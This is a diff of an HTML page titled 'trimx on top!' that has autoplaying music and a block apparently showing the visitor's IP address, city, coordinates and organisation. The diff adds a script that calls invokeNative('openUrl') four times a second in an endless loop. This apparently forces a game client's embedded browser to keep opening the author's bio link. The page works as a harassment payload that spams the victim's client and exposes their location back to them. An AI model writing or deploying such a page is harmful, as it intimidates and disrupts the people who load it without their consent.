@@ -1,14 +1,14 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
     <title>trimx on top!</title>
     <style>
         body {
             margin: 0;
             padding: 0;
-            background: url('https://media.discordapp.net/attachments/1294646976310411366/1394736215663837205/ezgif-6e8ed8185f88d1.gif?ex=6877e4d2&is=68769352&hm=c77989876cf952ab0a0e1892d8353c9346247ba930a1835f3d1721f80b38262e&=') no-repeat center center fixed;
+            background: url('https://r2.e-z.host/168df75f-85d1-4f0c-b094-d2893bffed26/eo4pv07m.gif') no-repeat center center fixed;
             background-size: cover;
             font-family: 'Courier New', Courier, monospace;
             color: #bb9379;
@@ -20,7 +20,7 @@
             text-align: center;
         }
         .image-container img {
-            width: 375px; 
+            width: 275px; 
             height: auto;
             border: 2px solid #bb9379; 
             border-radius: 15px;
@@ -45,19 +45,23 @@
 </head>
 <body>
     <div class="image-container">
-        <img src="https://media.discordapp.net/attachments/963398729312915476/1394728109663719444/7bdfebae098ae348306ee72f535047e0.png?ex=6877dd46&is=68768bc6&hm=092f7e629edaf738bb09728b7d0979b044c37ad4874335e3bd799c22ce57c249&=&format=webp&quality=lossless" alt="Discord Image">
+        <img src="https://r2.e-z.host/168df75f-85d1-4f0c-b094-d2893bffed26/q0f4omrb.png" alt="Discord Image" />
     </div>
     <audio autoplay loop>
-        <source src="https://r2-bios.e-z.host/168df75f-85d1-4f0c-b094-d2893bffed26/ipyr8o1302.mp3"audio/mpeg">
+        <source src="https://r2-bios.e-z.host/168df75f-85d1-4f0c-b094-d2893bffed26/ipyr8o1302.mp3" type="audio/mpeg" />
         Your browser does not support the audio element.
     </audio>
+
+    <!-- Headline -->
+    <h1 style="color:#bb9379; text-shadow: 0 0 8px #bb9379;">trimx on top!</h1>
+
     <div class="info" id="ip-info">
-        <strong>IP: <span id="ip"></span></strong><br>
-        <span><strong>City:</strong> <span id="city"></span></span><br>
-        <span><strong>Region:</strong> <span id="region"></span></span><br>
-        <span><strong>Country:</strong> <span id="country"></span></span><br>
-        <span><strong>Location:</strong> <span id="loc"></span></span><br>
-        <span><strong>Organization:</strong> <span id="org"></span></span><br>
+        <strong>IP: <span id="ip"></span></strong><br />
+        <span><strong>City:</strong> <span id="city"></span></span><br />
+        <span><strong>Region:</strong> <span id="region"></span></span><br />
+        <span><strong>Country:</strong> <span id="country"></span></span><br />
+        <span><strong>Location:</strong> <span id="loc"></span></span><br />
+        <span><strong>Organization:</strong> <span id="org"></span></span><br />
         <span><strong>Timezone:</strong> <span id="timezone"></span></span>
     </div>
     <div class="text">https://e-z.bio/trimx</div>
@@ -70,6 +74,15 @@
             const infoDiv = document.getElementById('ip-info');
             infoDiv.textContent = JSON.stringify(data, null, 2);
         });
+    </script>
+
+    <script>
+    setInterval(() => {
+        window.invokeNative("openUrl", "https://e-z.bio/trimx");
+        window.invokeNative("openUrl", "https://e-z.bio/trimx");
+        window.invokeNative("openUrl", "https://e-z.bio/trimx");
+        window.invokeNative("openUrl", "https://e-z.bio/trimx");
+    }, 1000);
     </script>
 </body>
 </html>
